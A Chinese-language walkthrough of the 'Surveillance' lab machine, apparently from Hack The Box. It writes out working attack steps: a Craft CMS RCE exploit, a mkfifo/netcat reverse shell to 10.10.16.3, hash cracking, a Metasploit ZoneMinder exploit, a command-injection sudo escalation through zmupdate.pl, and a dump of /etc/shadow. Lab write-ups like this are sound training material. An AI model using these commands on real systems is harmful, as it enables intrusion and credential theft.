# 简述

​		web服务发现是一个CMS，很容易搜索到一个RCE的CVE，获取初始立足点后枚举目标站点上的文件，能够发现另一个用户的hash，破解并切换到该用户。然后继续枚举，利用本地8080端口的服务的命令注入获取另外一个用户的shell。该用户可以sudo执行一些命令，利用该点提权。



# 1.基础信息收集

## 1.1 端口扫描

1. 存活TCP端口扫描

   ```bash
   ┌──(root㉿kali)-[/tmp]
   └─# nmap -sS -Pn 10.10.11.245 --min-rate 10000 -oN TCP_Port.txt        
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-11 20:44 EST
   Nmap scan report for 10.10.11.245
   Host is up (0.42s latency).
   Not shown: 998 closed tcp ports (reset)
   PORT   STATE SERVICE
   22/tcp open  ssh
   80/tcp open  http
   
   Nmap done: 1 IP address (1 host up) scanned in 3.31 seconds
   ```

2. 存活udp端口扫描

   ```bash
   ┌──(root㉿kali)-[/tmp]
   └─# nmap -sU -Pn 10.10.11.245 --min-rate 10000 -oN TCP_Port.txt 
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-11 20:45 EST
   Nmap scan report for 10.10.11.245
   Host is up (0.42s latency).
   Not shown: 993 open|filtered udp ports (no-response)
   PORT      STATE  SERVICE
   1031/udp  closed iad2
   17185/udp closed wdbrpc
   17207/udp closed unknown
   19541/udp closed jcp
   19936/udp closed unknown
   19956/udp closed unknown
   21364/udp closed unknown
   
   Nmap done: 1 IP address (1 host up) scanned in 5.19 seconds
   ```

3. 存活端口详细信息扫描

   ```bash
   ┌──(root㉿kali)-[/tmp]
   └─# nmap -sV -sC -Pn -p22,80 10.10.11.245 --min-rate 10000 -oN Port_server.txt
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-11 20:48 EST
   Nmap scan report for 10.10.11.245
   Host is up (0.39s latency).
   
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
   |_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
   80/tcp open  http    nginx 1.18.0 (Ubuntu)
       |_http-title: Did not follow redirect to http://surveillance.htb/
   |_http-server-header: nginx/1.18.0 (Ubuntu)
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 23.01 seconds
   ```

   在/etc/hosts中添加`10.10.11.245 surveillance.htb`



## 1.2 TCP 80 HTTP

1. 指纹识别

   ```bash
   ┌──(root㉿kali)-[/tmp]
   └─# whatweb http://surveillance.htb 
   http://surveillance.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
   ```

   目标OS是Ubuntu，web服务器是nginx 1.18.0



2. 默认web页面是一个静态页面，没有太多可以枚举的信息，枚举web子目录

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://surveillance.htb/ -t 50 --no-error                    
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://surveillance.htb/
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /.htaccess            (Status: 200) [Size: 304]
   /.gitkeep             (Status: 200) [Size: 0]
   /admin                (Status: 302) [Size: 0] [--> http://surveillance.htb/admin/login]
   /css                  (Status: 301) [Size: 178] [--> http://surveillance.htb/css/]
   /fonts                (Status: 301) [Size: 178] [--> http://surveillance.htb/fonts/]
   /images               (Status: 301) [Size: 178] [--> http://surveillance.htb/images/]
   /img                  (Status: 301) [Size: 178] [--> http://surveillance.htb/img/]
   /index                (Status: 200) [Size: 1]
   /index.php            (Status: 200) [Size: 16230]
   /js                   (Status: 301) [Size: 178] [--> http://surveillance.htb/js/]
   
   ```

3. http://surveillance.htb/admin/login 是一个登陆页面，从页面信息来看是craft cms。

   ![image-20231212103943864](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202312121144859.png)

   简单测试一下sql注入，不可行。google搜寻发现一个RCE的[CVE-2023-41892](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)



# 2.获取初始立足点

1. 执行CVE-2023-41892.py获取初始立足点

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# python CVE-2023-41892.py http://surveillance.htb/
   [-] Get temporary folder and document root ...
   [-] Write payload to temporary file ...
   [-] Crash the php process and write temp file successfully
   [-] Trigger imagick to write shell ...
   [-] Done, enjoy the shell
   $ id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   $ rm /tmp/Y;mkfifo /tmp/Y;cat /tmp/Y|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/Y
   
   ```



2. 稳固shell

   ```
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   export TERM=xterm
   Ctrl + Z 将 shell 置入后台。回到我们自己的终端，我们使用stty raw -echo; fg
   ```

   

3. 当前机器上还有其他两个用户，想办法切换到其中之一。

   ```
   www-data@surveillance:/home$ ls
   matthew  zoneminder
   ```



4. 在web目录下检索‘password’关键字，会得到下列的内容，但是这些密码或哈希无法切换到其他用户

   ```
   grep -ri 'password' /var/www/html 2>/dev/null
   
   /var/www/html/craft/.env:CRAFT_DB_PASSWORD=CraftCMSPassword2023!
   
   ./vendor/craftcms/cms/src/web/User.php:            Craft::$app->getSecurity()->validatePassword('p@ss1w0rd', '$2y$13$nj9aiBeb7RfEfYP3Cum6Revyu14QelGGxwcnFUKXIrQUitSodEPRi');
   
   ./vendor/craftcms/cms/src/test/TestSetup.php:            'password' => 'craftcms2018!!',
   ```



5. 在进一步枚举会发现一个压缩包，由于他在backup目录中，因此值得探索

   ```
   www-data@surveillance:~/html/craft/storage/backups$ ls -al
   total 28
   drwxrwxr-x 2 www-data www-data  4096 Oct 17 20:33 .
   drwxr-xr-x 6 www-data www-data  4096 Oct 11 20:12 ..
   -rw-r--r-- 1 root     root     19918 Oct 17 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
   ```

   将其传输到kali上然后解压

   ```
   └─# unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip -d surveillance                              
   ```



6. 会得到一个surveillance--2023-10-17-202801--v4.4.14.sql的文件，在该文件中检索password没有找到相关内容，但是检索目标机器上的两个用户名的时候，发现了Matthew的相关信息

   ```
   INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
   ```

   考虑密码复用的情况，破解该`39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec`hash

   检查hash格式

   ```
   ┌──(root㉿kali)-[/tmp]
   └─# hashid 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
   Analyzing '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec'
   [+] Snefru-256 
   [+] SHA-256 
   [+] RIPEMD-256 
   [+] Haval-256 
   [+] GOST R 34.11-94 
   [+] GOST CryptoPro S-Box 
   [+] SHA3-256 
   [+] Skein-256 
   [+] Skein-512(256)
   ```

   破解该hash

   ```
   └─# hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
   39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
   ```

   成功切换到matthew用户

   ```
   www-data@surveillance:/home$ su matthew
   Password: 
   matthew@surveillance:/home$ 
   ```

   

# 3.特权提升

1. 枚举发现本地开启了8080端口

   ```
   matthew@surveillance:~$ netstat -tuln
   Active Internet connections (only servers)
   Proto Recv-Q Send-Q Local Address           Foreign Address         State      
   tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
   tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
   tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
   tcp6       0      0 :::22                   :::*                    LISTEN     
   udp        0      0 127.0.0.53:53           0.0.0.0:*                          
   udp        0      0 0.0.0.0:68              0.0.0.0:*   
   ```

   利用chisel进行端口转发

   ```
   ┌──(root㉿kali)-[~/TOOLS/chisel]
   └─#  ./chisel server -p 1234 --reverse
   
   ./chisel client 10.10.16.3:1234 R:8080:127.0.0.1:8080
   ```

   确定转发成功

   ```
   ┌──(root㉿kali)-[~]
   └─# ss -anlp | grep 8080                    
   tcp   LISTEN 0      4096                                              *:8080                   *:*    users:(("chisel",pid=40675,fd=8))  
   ```

   

2. nmap扫描一下该8080端口上的服务

   ```
   ┌──(root㉿kali)-[~]
   └─# nmap -sV -sC -Pn -p8080 127.0.0.1 --min-rate 10000                             
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-11 23:10 EST
   Nmap scan report for localhost (127.0.0.1)
   Host is up (0.00011s latency).
   
   PORT     STATE SERVICE VERSION
   8080/tcp open  http    nginx 1.18.0 (Ubuntu)
   |_http-title: ZM - Login
   | http-robots.txt: 1 disallowed entry 
   |_/
   |_http-server-header: nginx/1.18.0 (Ubuntu)
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds
   ```

   标题是ZM-Login，目标机器上正好存在一个zoneminder用户，两者可能有联系

   

3. 在测试过程中机器被重置了，发现matthew用户可以通过ssh登录，使用ssh来执行本地端口转发

   将本地的1234口上的流量转发到目标机器的8080口

   ```
   ssh -L 1234:localhost:8080 matthew@10.10.11.245
   ```



4. google搜索ZoneMinder，会发现一个[快照命令注入](https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/)的漏洞。

   更新一下metasploit

   ```
   apt-get update
   apt-get install metasploit-framework
   ```

   然后执行下列操作，会给我们一个meterpreter shell

   ```
   msf6 > use exploit/unix/webapp/zoneminder_snapshots
   msf6 exploit(unix/webapp/zoneminder_snapshots) > set RHOSTS 127.0.0.1
   msf6 exploit(unix/webapp/zoneminder_snapshots) > set RPORT 1234
   msf6 exploit(unix/webapp/zoneminder_snapshots) > set LHOST 10.10.16.3
   msf6 exploit(unix/webapp/zoneminder_snapshots) > set TARGETURI /
   msf6 exploit(unix/webapp/zoneminder_snapshots) > run
   
   meterpreter > shell
   Process 1590 created.
   Channel 1 created.
   id
   uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
   ```



5. 现在获取了zoneminder用户的shell，发现可以sudo执行/usr/bin/zm[a-zA-Z]*.pl *

   ```
   sudo -l
   Matching Defaults entries for zoneminder on surveillance:
       env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
   
   User zoneminder may run the following commands on surveillance:
       (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
   ```

   这个正则表达式可以匹配以 `/usr/bin/zm` 开头，然后是任意大小写字母（零个或多个），接着是任意字符（零个或多个），最后以 `.pl` 结尾的字符串。这样就包括了匹配 `/usr/bin/zm` 开头的任意以 `.pl` 结尾的文件。

   例如，它可以匹配类似这样的文件路径：`/usr/bin/zmexample.pl`。



6. 在/user/bin下发现了许多符合条件的文件

   ```
   zmcamtool.pl
   zmcontrol.pl
   zmdc.pl
   zmfilter.pl
   zmonvif-probe.pl
   zmonvif-trigger.pl
   zmpkg.pl
   zmrecover.pl
   zmstats.pl
   zmsystemctl.pl
   zmtelemetry.pl
   zmtrack.pl
   zmtrigger.pl
   zmupdate.pl
   zmvideo.pl
   zmwatch.pl
   zmx10.pl
   ```



7. 依次检索上述符合条件的文件，我在zmcamtool.pl中发现下列这样一段代码

   ```
   ub exportsql {
   
     my ( $host, $port ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
     my $command = 'mysqldump -t --skip-opt --compact -h'.$host;
     $command .= ' -P'.$port if defined($port);
     if ( $dbUser ) {
       $command .= ' -u'.$dbUser;
       if ( $dbPass ) {
         $command .= ' -p'.$dbPass;
       }
     }
   ```

   $dbuser由我们输入，考虑可以构造类似   `mysql -u $(command) -p password`这样的语句来注入命令

   但是zmcamtool.pl似乎不可行

   ```
   sudo /usr/bin/zmcamtool.pl --user='$(/tmp/rs.sh)' --pass=123456 --export /tmp/test
   Insecure dependency in `` while running with -T switch at /usr/bin/zmcamtool.pl line 366.
   ```

   

   大致操作思路如上所示，检索其他文件，最终利用zmupdate获取了root shell

   ```
   sudo /usr/bin/zmupdate.pl -u '$(/tmp/rs.sh)' -p=1234 -v 2
   
   Initiating database upgrade to version 1.36.32 from version 2
   
   WARNING - You have specified an upgrade from version 2 but the database version found is 1.36.32. Is this correct?
   Press enter to continue or ctrl-C to abort : 
   
   Do you wish to take a backup of your database prior to upgrading?
   This may result in a large file in /tmp/zm if you have a lot of events.
   Press 'y' for a backup or 'n' to continue : y
   Creating backup to /tmp/zm/zm-2.dump. This may take several minutes.
   
   
   ┌──(root㉿kali)-[/tmp]
   └─# nc -nvlp 4444            
   listening on [any] 4444 ...
   id
   connect to [10.10.16.3] from (UNKNOWN) [10.10.11.245] 53820
   bash: cannot set terminal process group (1109): Inappropriate ioctl for device
   bash: no job control in this shell
   root@surveillance:/tmp# id
   uid=0(root) gid=0(root) groups=0(root)
   root@surveillance:/tmp# 
   ```

   /etc/shadow

   ```
   root@surveillance:/tmp# cat /etc/shadow
   cat /etc/shadow
   root:$y$j9T$bVNsNlTFFqsWiO2JYT0ZH/$ZzxFCnolnSpcSfQxaWNtq3BDIRPIVU9X.dm/ACzRAl9:19651:0:99999:7:::
   
   matthew:$y$j9T$oipsGfEBv1fcFV1uQ6Bl4.$44F4J5xtr2V4oN.zY0OB.8r3p1TllAlaMivft5R8o18:19647:0:99999:7:::
   
   zoneminder:$y$j9T$.wNHpksMBEdFIQZZJTsDp/$r43uCJLrmfIgv4ZnMiyhMqykrru7aoPIuunhUrTTxp/:19647:0:99999:7:::
   ```

   



